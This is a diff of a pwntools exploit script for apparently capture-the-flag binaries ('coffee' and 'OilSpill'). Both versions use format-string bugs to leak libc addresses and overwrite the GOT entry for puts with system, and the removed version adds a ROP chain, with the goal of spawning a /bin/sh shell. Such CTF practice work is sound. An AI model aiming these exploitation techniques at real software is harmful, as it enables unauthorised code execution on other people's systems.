@@ -11,36 +11,30 @@ def start(argv=[], *a, **kw):
 
 # Specify your GDB script here for debugging
 gdbscript = '''
-break *0x401201
+break *0x0000000000400724
 continue
 '''.format(**locals())
 
-exe = './challenge/coffee'
+exe = './challenge/OilSpill'
 elf = context.binary = ELF(exe, checksec=False)
 libc = elf.libc
-p = start()
 
-pop_rdi_ret = 0x401293
-pop5 = 0x40128b
+ret = 0x0000000000400536
+pop3 = 0x00000000004007de
+pop_rdi_ret = 0x00000000004007e3
+pop4 = 0x00000000004007dc
 
-# leak libc
-payload =  b'%29$016p'
-# overwrite got puts to entrypoint
-payload += b'%4199035c%9$naaa'
-payload += p64(elf.got.puts)
-payload += p64(elf.entrypoint)
+p = start(); out = p.recvline().split(b', ')
 
-p.sendline(payload)
-leak = int(p.recvline()[:16], 16)
+puts = int(out[0], 16)
+stack = int(out[2], 16)
 
-info("Leak libc: " + hex(leak))
-libc.address = leak - (libc.sym.system -159696)
+info("Leak puts: " + hex(puts))
+info("Leak stack: " + hex(stack))
 
-p.sendline(flat(
-    p64(0)*4,                           # padding
-    pop_rdi_ret,
-    next(libc.search(b'/bin/sh\x00')),
-    libc.sym.system
-))
+libc.address = puts - libc.sym.puts
+
+payload = fmtstr_payload(8, {elf.got.puts : libc.sym.system, elf.sym.x:b'/bin/sh\x00'}, write_size='short')
+p.sendlineafter(b'?', payload)
 
 p.interactive()
